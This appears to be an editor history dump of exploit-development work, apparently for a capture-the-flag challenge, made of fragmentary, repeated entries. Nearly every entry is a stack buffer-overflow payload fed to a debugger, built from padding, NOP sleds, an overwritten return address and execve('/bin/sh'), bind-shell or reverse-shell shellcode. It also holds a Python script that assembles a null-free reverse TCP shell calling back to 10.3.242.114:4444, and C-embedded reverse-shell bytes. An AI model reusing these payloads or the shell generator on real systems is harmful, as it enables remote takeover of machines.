120698bc66ccf2fe87b2c0707abfe466|file:///home/neo/ccsc/guydebois/shellcode.txt|6|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaa\x67\x06\x40\x00\x00\x00"`
1c6a336f314a7c9d925a6fdb6acca9f2|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"`
676287f62b9aabec01c854d4606f0769|file:///home/neo/ccsc/guydebois/shellcode.txt|6|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaaaaa\x67\x06\x40\x00\x00\x00"`
3fc53fc22ea40f1a0afd78fc2cd9aa0f|file:///home/neo/ccsc/guydebois/shellcode.txt|6|16|v|text
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
3af1292502405df4a521f3c1d1b577a0|file:///home/neo/shellc|1|1|V|
	\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80
f874d370a16a5019722c27e23dbc7fd3|file:///home/neo/ccsc/guydebois/shellcode.txt|6|1|V|text
	r <<< `printf "\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaa\x67\x06\x40\x00\x00"`
e09c80c42fda55f9d992e59ca6b3307d|file:///home/neo/ccsc/guydebois/shellcode.txt|6|352|v|text
	aaaaaaaaaa
7d5e0ce67ebdad8cbecd944ef5215891|file:///home/neo/ccsc/guydebois/shellcode.txt|6|352|v|text
	bbaaaa
5b1f7e8cda1af1611b91a33c82eee15e|file:///home/neo/ccsc/guydebois/shellcode.txt|6|1|V|text
	r <<< `printf "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80\x67\x06\x40\x00\x00"`
270f9f8c97ce3640b466fa421b8f507b|file:///home/neo/ccsc/guydebois/getshell.py|6|26|v|python
	\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\x04\x05\x04\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80
15518b30c564a2e29948d57e4c279292|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacccccccc\x67\x06\x40\x00\x00"`
0ff6b0fc605029c5b1f7cc3031221dd9|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacccccccc\x67\x06\x40\x00\x00ddddddddd"`
58cbc2132b53deb5ecb46ed30439ab2c|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacccccccc\x67\x06\x40\x00\x00\x00\x00\x00\x00ddddddddd"`
f69e2645ccbe063f24958bbb83aaca8d|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x31\xc0\x50\x68\x2f\x2f\x73\x68\x67\x06\x40\x00\x00\x00\x00\x00\x00ddddddddd"`
222977fdbf22037c2a4de23806f994e1|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x31\xc0\x50\x68\x2f\x2f\x73\x68\x67\x06\x40\x00\x00\x00\x00\x00\x00\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd"`
8b51ea98fae6f8f44bc55c291c30233d|file:///home/neo/shellc|1|1|v|
	\x31\xdb\x53\x43\x53\x6a
f2b6c0cb3b80c4841e118013b92b820b|file:///home/neo/shellc|1|1|V|
	\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80
a76192eda5ef1e75784c8dfbfd2689ef|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x31\xdb\x53\x43\x53\x6a\x67\x06\x40\x00\x00\x00\x00\x00\x00\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"`
7d3d262d089173c9d553deff7e8e9c34|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	i <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x31\xdb\x53\x43\x53\x6a\x67\x06\x40\x00\x00\x00\x00\x00\x00\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80 `
e2491ead3862644737775e00eee7e90b|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x31\xdb\x53\x43\x53\x6a\x67\x06\x40\x00\x00\x00\x00\x00\x00\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80 `
bc89cbd450b247db7c3f9b9ff65acc2d|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x31\xdb\x53\x43\x53\x6a\x67\x06\x40\x00\x00\x00\x00\x00\x00\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80`
be22399f048a2f39a4e90de47f347793|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x00\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"`
513cab102d0300678dd344acc89c6578|file:///home/neo/ccsc/guydebois/shellcode.txt|17|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"`
84eb8b64f9314d8ba4dd47fe45907c9b|file:///home/neo/ccsc/guydebois/shellcode.txt|17|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96\x43\x52\x66\x68\x41\x42\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
5a0d169be8ad3ea4a01f4f9b64ceb0a2|file:///home/neo/ccsc/guydebois/shellcode.txt|8|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbaaaa\x67\x06\x40\x00\x00"`
	
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"`
	
	r <<< `printf "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x67\x06\x40\x00\x00"` 
	
	
dd496e8fc779f4d3585b82cdfdda4707|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`
fcdb739150b88e3188ec3dc3f8e1101f|file:///home/neo/ccsc/guydebois/shellcode.txt|10|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"`
152f16f09c789b9be02fa04ba8285832|file:///home/neo/ccsc/guydebois/shellcode.txt|13|1|V|text
	\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
8029a92049d71bcfcd465ecab9b0a456|file:///home/neo/ccsc/guydebois/shellcode.txt|12|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"`
383a8c44a02675d82c1f54637579b4b5|file:///home/neo/ccsc/guydebois/create_rev.py|30|1|V|python
	--Type <RET> for more, q to quit, c to continue without paging--
0bc39d73dda1fef3ca059b67254bb2f1|file:///home/neo/ccsc/guydebois/create_rev.py|1|1|V|python
	#!/usr/bin/env python3
	
	import ctypes, struct, binascii, os, socket
	from keystone import *
	
	#####################################################
	#                                                   #
	#   Dynamic null-free reverse TCP shell(65 bytes)   *
	#           Written by Philippe Dugre               #
	#                                                   #
	#####################################################
	
	#shellcode =    b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e"
	#shellcode +=   b"\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee"
	#shellcode +=   b"\xa3\x80\xff\xff\xfe\x48\xf7\xd9\x51\x54"
	#shellcode +=   b"\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21"
	#shellcode +=   b"\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52"
	#shellcode +=   b"\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
	#shellcode +=   b"\x51\x54\x5f\x0f\x05"
	
	# This script requires keystone to generate the shellcode,
	# but it can easily be compiled with nasm with a few modifications.
	
	# Generates struct from IP and port
	def sockaddr():
	
	    # Change this
	    IP = "10.3.242.114"
	    PORT = 4444
	
	    family = struct.pack('H', socket.AF_INET)
	    portbytes = struct.pack('H', socket.htons(PORT))
	    ipbytes = socket.inet_aton(IP)
	    number = struct.unpack('Q', family + portbytes + ipbytes)
	    number = -number[0]        #negate
	    return "0x" + binascii.hexlify(struct.pack('>q', number)).decode('utf-8')
	
	
	# Function to format shellcode to a printable output. Currently python3 formatting.
	# Modify according to the language you use.
	def format_shellcode(shellcode):
	    LINE_LENGTH=40
	    raw = binascii.hexlify(shellcode)
	    escaped = (b"\\x" + b"\\x".join(raw[i:i+2] for i in range (0, len(raw), 2))).decode('utf-8')
	    lines = [escaped[i: i+LINE_LENGTH] for i in range(0, len(escaped), LINE_LENGTH)]
	    return "shellcode = \tb\"" + "\"\nshellcode += \tb\"".join(lines) + "\""
	
	
	def main():
	    # Note: null-byte depends on the address and port.
	    # Special modifications might be needed for some address.
	    address = sockaddr()
	
	    # Shellcode is here
	    assembly = (
	        "socket:                             "
	        "   push byte 41                    ;"      # Push/pop will set syscall num
	        "   pop rax                         ;"
	        "   cdq                             ;"      # cdq sets rdx to 0 if rax is positive
	        "   push byte 2                     ;"      # AF_INET = 2
	        "   pop rdi                         ;"
	        "   push byte 1                     ;"      # SOCK_STREAM = 1
	        "   pop rsi                         ;"
	        "   syscall                         ;"      # socket(AF_INET, SOCK_STREAM, 0)
	        "connect:                           ;"
	        "   xchg eax, edi                   ;"      # rdi is 2, so moving only al is doable
	        "   mov al, 42                      ;"
	        "   mov rcx, " + address +         ";" +    # Socket address and port
	        "   neg rcx                         ;"
	        "   push rcx                        ;"
	        "   push rsp                        ;"      # mov rsi, rsp. This it the pointer to sockaddr
	        "   pop rsi                         ;"
	        "   mov dl, 16                      ;"      # sockaddr length
	        "   syscall                         ;"      # connect(s, addr, len(addr))
	        "dup2:                              ;"
	        "   push byte 3                     ;"      # Start with 3 and decrement
	        "   pop rsi                         ;"
	        "dup2_loop:                          "      # Duplicate socket fd into stdin,
	                                                    # stdout and stderr, which fd are 0, 1 and 2
	        "   mov al, 33                      ;"      # If there is no error, rax is 0 on connect and dup2
	        "   dec esi                         ;"
	        "   syscall                         ;"      # dup2(s, rsi)
	        "   jnz dup2_loop                   ;"      # Jump when esi == 0
	        "execve:                             "
	        "   cdq                             ;"
	        "   mov al, 59                      ;"      # execve syscall is 59
	        "   push rdx                        ;"      # Put null-byte in /bin//sh
	        "   mov rcx, 0x68732f2f6e69622f     ;"      # /bin//sh
	        "   push rcx                        ;"
	        "   push rsp                        ;"      # rsp points to the top of the stack, which is occupied by /bin/sh
	        "   pop rdi                         ;"      # We use a push/pop to prevent null-byte and get a shorter shellcode
	        "   syscall                         ;"      # execve('/bin//sh', 0, 0)
	    )
	
	    engine = Ks(KS_ARCH_X86, KS_MODE_64)
	    shellcode, count = engine.asm(assembly)
	    shellcode = bytearray(shellcode) # Needs to be mutable for later
	
	    print("Number of instructions: " + str(count))
	
	    # Print shellcode in a copy-pasteable format
	    print()
	    print("Shellcode length: %d" % len(shellcode))
	    print()
	    print(format_shellcode(shellcode))
	    print()
231496871f9a2ed5404086f91b6ef55f|file:///home/neo/ccsc/guydebois/reverse.py|6|1|V|python
	print("test")
905e2db7f071c9ec8f562e3df25f9ef9|file:///home/neo/ccsc/guydebois/reverse.py|54|5|V|python
	    print("test")
08aa0c5cc07c5efe590ba89320b45dbc|file:///home/neo/ccsc/guydebois/reverse.py|50|1|V|python
	def main():
011ed7ef5973d575fd302855b9629b2c|file:///home/neo/ccsc/guydebois/shellcode.txt|14|1|V|text
	\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee\xa3\xf5\xfc\x0d\x8d\x48\xf7\xd9\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x0f\x05
5f4b838c86f1a3dddbc74a3d2a1af790|file:///home/neo/ccsc/guydebois/shellcode.txt|11|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee\xa3\xf5\xfc\x0d\x8d\x48\xf7\xd9\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x0f\x05"`
4a04ec8ece4f3fc811362c96e8ad4943|file:///home/neo/ccsc/guydebois/shellcode.txt|11|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee\xa3\xf5\xfc\x0d\x8d\x48\xf7\xd9\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x0f\x05"`
2444000fe9839f31874b455cdff7568c|file:///home/neo/ccsc/guydebois/shellrev.c|8|1|V|c
	"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
	"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
	"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24"
	"\x02\x7a\x69\xc7\x44\x24\x04\x72\xf2\x03\x0a\x48\x89\xe6\x6a\x10"
	"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48"
	"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
	"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
	"\x5f\x6a\x3b\x58\x0f\x05";
10f1f56ab0ce1a9ceec498472a97bce9|file:///home/neo/ccsc/guydebois/shellcode.txt|13|1|V|text
	\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x72\xf2\x03\x0a\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05
498995a18d969be3268f6f60629e16be|file:///home/neo/ccsc/guydebois/shellcode.txt|13|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x72\xf2\x03\x0a\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"`
8a00047db7206e75d3ae596b35aa5d6a|file:///home/neo/ccsc/guydebois/shellcode.txt|12|1|V|text
	
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\xc7\x44\x24\x04\x72\xf2\x03\x0a\x48\x89\xe6\x6a\x10\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"`
c7001954feea22941bd8e6e572f0a67e|file:///home/neo/ccsc/guydebois/shellcode.txt|13|8|v|text
